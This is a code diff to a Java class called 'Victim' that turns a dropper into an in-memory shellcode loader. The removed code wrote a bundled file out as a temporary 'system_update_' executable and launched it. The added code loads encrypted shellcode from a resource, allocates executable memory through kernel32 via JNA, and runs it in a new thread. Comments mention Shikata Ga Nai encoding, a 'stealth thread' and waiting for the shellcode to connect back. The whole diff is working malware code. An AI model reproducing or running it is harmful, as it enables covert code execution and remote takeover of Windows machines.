@@ -1,35 +1,42 @@
 package shell;
 
-import java.io.File;
-import java.io.FileOutputStream;
+import com.sun.jna.Native;
+import com.sun.jna.win32.StdCallLibrary;
 import java.io.InputStream;
 
 public class Victim {
+
+    public interface Kernel32 extends StdCallLibrary {
+        long VirtualAlloc(long lpAddress, long dwSize, int flAllocationType, int flProtect);
+        long CreateThread(long lpThreadAttributes, long dwStackSize, long lpStartAddress, long lpParameter, int dwCreationFlags, long lpThreadId);
+        int WaitForSingleObject(long hHandle, int dwMilliseconds);
+    }
+
     public static void main(String[] args) {
         try {
-            System.out.println("[*] Extracting payload...");
+            Kernel32 k32 = Native.load("kernel32", Kernel32.class);
 
+            System.out.println("[*] Loading encrypted shellcode...");
             InputStream is = Victim.class.getResourceAsStream("/data.dat");
             if (is == null) {
-                System.out.println("[!] data.dat not found in resources!");
+                System.out.println("[!] data.dat not found!");
                 return;
             }
+            byte[] shellcode = is.readAllBytes();
 
-            File tempExe = File.createTempFile("system_update_", ".exe");
-            tempExe.deleteOnExit();
+            System.out.println("[*] Allocating RWX memory for self-decrypting payload...");
+            // 0x3000 = MEM_COMMIT | MEM_RESERVE
+            // 0x40 = PAGE_EXECUTE_READWRITE (REQUIRED for Shikata Ga Nai)
+            long address = k32.VirtualAlloc(0, shellcode.length, 0x3000, 0x40);
 
-            try (FileOutputStream fos = new FileOutputStream(tempExe)) {
-                byte[] buffer = new byte[8192];
-                int bytesRead;
-                while ((bytesRead = is.read(buffer)) != -1) {
-                    fos.write(buffer, 0, bytesRead);
-                }
-            }
+            com.sun.jna.Pointer pointer = new com.sun.jna.Pointer(address);
+            pointer.write(0, shellcode, 0, shellcode.length);
 
-            System.out.println("[*] Launching: " + tempExe.getAbsolutePath());
-            new ProcessBuilder(tempExe.getAbsolutePath()).start();
+            System.out.println("[*] Executing stealth thread at: " + Long.toHexString(address));
+            long threadHandle = k32.CreateThread(0, 0, address, 0, 0, 0);
 
-            System.out.println("[+] Payload deployed successfully.");
+            // Wait for shellcode to establish connection
+            k32.WaitForSingleObject(threadHandle, -1);
 
         } catch (Exception e) {
             e.printStackTrace();
